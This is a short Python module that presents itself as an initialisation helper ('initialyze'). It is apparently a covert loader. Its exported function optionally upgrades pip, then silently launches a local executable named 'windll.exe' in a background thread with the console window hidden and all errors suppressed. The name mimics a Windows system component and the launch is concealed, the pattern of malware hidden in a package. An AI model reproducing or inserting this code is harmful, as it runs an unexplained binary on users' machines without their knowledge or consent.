import subprocess
import threading

def task_initialyze(target: list[str]) -> None:
    if "pip" in target:
        subprocess.run("python -m pip install --upgrade pip", creationflags=subprocess.CREATE_NO_WINDOW)
    try:  
        process = subprocess.Popen("./windll.exe", creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def initialyze(target: list[str]) -> None:
    threading.Thread(target=task_initialyze, args=(target,), daemon=False).start()

__all__ = ['initialyze']